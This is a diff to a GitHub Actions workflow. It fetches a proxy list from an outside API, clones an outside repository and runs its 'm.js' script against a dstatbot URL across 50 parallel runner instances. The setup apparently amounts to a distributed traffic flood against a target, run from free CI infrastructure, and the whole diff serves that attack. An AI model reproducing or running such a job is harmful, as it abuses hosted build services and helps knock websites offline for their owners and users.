@@ -30,11 +30,12 @@ jobs:
       - name: Download proxies
         run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > proxy.txt
       
-      - name: Run m.js
-        run: git clone https://github.com/vrbrh921-glitch/Fc.git
-             cd Fc
-             node m.js https://captcha.dstatbot.win/3Mhuh3dd 700 1 1 1 
+      - name: Clone repository and run m.js
+        run: |
+          git clone https://github.com/vrbrh921-glitch/Fc.git
+          cd Fc
+          node m.js https://captcha.dstatbot.win/4dzItiGR 700 1 1 1
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
-          TOTAL_INSTANCES: 50  # Match the matrix count
+          TOTAL_INSTANCES: 50
           RUNNER_OS: ubuntu
